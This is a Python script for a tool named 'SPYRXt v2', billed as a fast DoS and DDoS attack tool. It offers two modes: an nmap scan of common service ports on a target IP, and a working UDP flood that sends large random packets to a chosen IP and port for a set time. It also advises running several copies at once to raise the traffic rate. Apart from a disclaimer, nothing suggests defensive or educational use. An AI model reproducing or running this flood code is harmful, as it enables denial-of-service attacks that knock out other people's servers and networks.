import socket
import random
import time
import os
import nmap
import colorama

try:
    import colorama
except ImportError:
    exit("Colorama is not installed (pip install colorama)")

from colorama import Fore, Back, Style

main1 = input(Fore.BLUE+ "Attack[a] ip or scan[s]~> "+ Fore.RED)

if main1 == "s":
    print(Fore.RED + "We aren't responsible for whatever you do using this tool. Use it at your own risk.")
    def scan_ports(ip):
        dangerous_ports = [20, 21, 22, 23, 25, 53, 80, 110, 137, 139, 143, 443, 445, 3306, 3389]
        nm = nmap.PortScanner()
        port_string = ','.join(str(port) for port in dangerous_ports)
        nm.scan(hosts=ip, ports=port_string, arguments='-A')  
        return nm[ip]

    if __name__ == "__main__":
        target_ip = input(Fore.RED + "Enter the IP address to scan: " + Fore.BLUE)
        print(Fore.RED + f"Scanning {target_ip}...")
        scan_result = scan_ports(target_ip)

        if scan_result['tcp']:
            print(Fore.RED + "Open Ports: ")
            for port in scan_result['tcp']:
                print(Fore.BLUE + f"Port {port}: {scan_result['tcp'][port]['name']}")
        else:
            print(Fore.RED + "No open ports found")

if main1 == "a":
    print("\n" * 100)
    print(Fore.RED)
    print("""
    /      \                                                   |  \    
    |  $$$$$$\  ______   __    __   ______  __    __   ______  _| $$_   
    | $$___\$$ /      \ |  \  |  \ /      \|  \  /  \ /      \|   $$ \  
    \$$    \ |  $$$$$$\| $$  | $$|  $$$$$$\\$$\/  $$|  $$$$$$\\$$$$$$  
    _\$$$$$$\| $$  | $$| $$  | $$| $$   \$$ >$$  $$ | $$   \$$ | $$ __ 
    |  \__| $$| $$__/ $$| $$__/ $$| $$      /  $$$$\ | $$       | $$|  \
    \$$    $$| $$    $$ \$$    $$| $$     |  $$ \$$\| $$        \$$  $$
     \$$$$$$ | $$$$$$$  _\$$$$$$$ \$$      \$$   \$$ \$$         \$$$$ 
             | $$      |  \__| $$                                      
            | $$       \$$    $$                                      
              \$$        \$$$$$$                               
    """)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(Fore.RED + "We aren't responsible for whatever you do using this tool. Use it at your own risk.")
    print("")
    print(Fore.RED + "             SOIC Details: ")
    print(Fore.BLUE + """
          |-----------------|
          | SPYRXt v2       |
          | Inspired by SPYR|
          | Creator: Spyrx  |
          | Purpose: Fast DoS|
          | & DDoS Attacks  |
          | Xtream Orbit Ion|
          | Canon           |
          |-----------------|
    """)
    print(Fore.RED + "DoS Speed: " + Fore.BLUE + "NEW 500+ Mbps")
    print(Fore.RED + "[!] " + Fore.BLUE + "Tip: Open & Use SPYRXT on multiple Windows to get 1Gbps")
    print("")

    bytes = random._urandom(65000)

    ip = input(Fore.RED + 'Target IP: ' + Fore.BLUE)
    print(Fore.RED + "Most popular 80 , 443")
    port = int(input(Fore.BLUE + 'Port: ' + Fore.BLUE))

    duration = input(Fore.RED + 'Number of seconds to send packets: ' + Fore.BLUE)
    print(" ")

    timeout = time.time() + float(duration)
    sent = 0

    while True:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print(Fore.BLUE + "[+] " + Fore.BLUE + "SOIC " + Fore.BLUE + "Sent %s packet to %s through port %s" % (sent, ip, port))
